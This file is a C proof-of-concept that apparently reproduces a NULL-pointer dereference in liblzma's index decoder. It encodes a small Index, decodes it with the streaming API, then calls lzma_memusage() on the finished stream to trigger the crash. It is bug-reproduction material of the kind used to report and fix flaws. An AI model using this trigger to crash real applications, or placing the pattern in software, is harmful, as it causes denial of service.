// PoC: NULL-pointer dereference in index_decoder_memconfig() (reached via
// the public lzma_memusage()/lzma_memlimit_get()/lzma_memlimit_set() API)
// when it is called on an lzma_stream that was initialized with
// lzma_index_decoder() after the Index has finished decoding.
//
// On successful completion the index decoder hands the built lzma_index
// to the caller and clears its own pointer to it, but the decoder's
// memconfig callback still dereferences that (now NULL) pointer. Querying
// the memory usage of a finished stream before calling lzma_end() is an
// ordinary, documented thing for an application to do.
#include <lzma.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

int
main(void)
{
	// Build a small, perfectly ordinary Index with one Record.
	lzma_index *idx = lzma_index_init(NULL);
	if (idx == NULL)
		return 1;

	if (lzma_index_append(idx, NULL, 4096, 4096) != LZMA_OK)
		return 1;

	uint8_t index_buf[256];
	size_t index_pos = 0;
	if (lzma_index_buffer_encode(idx, index_buf, &index_pos,
			sizeof(index_buf)) != LZMA_OK)
		return 1;

	lzma_index_end(idx, NULL);

	// Decode that Index back using the streaming API, exactly like an
	// application parsing a .xz Index field would.
	lzma_stream strm = LZMA_STREAM_INIT;
	lzma_index *decoded = NULL;
	if (lzma_index_decoder(&strm, &decoded, UINT64_MAX) != LZMA_OK)
		return 1;

	strm.next_in = index_buf;
	strm.avail_in = index_pos;

	lzma_ret ret = lzma_code(&strm, LZMA_RUN);
	if (ret != LZMA_STREAM_END) {
		printf("unexpected decode result: %d\n", ret);
		return 1;
	}

	// The Index has fully decoded. Before tearing the stream down,
	// check how much memory it ended up using.
	uint64_t memusage = lzma_memusage(&strm);
	printf("memusage = %llu\n", (unsigned long long)memusage);

	lzma_end(&strm);
	lzma_index_end(decoded, NULL);

	return 0;
}
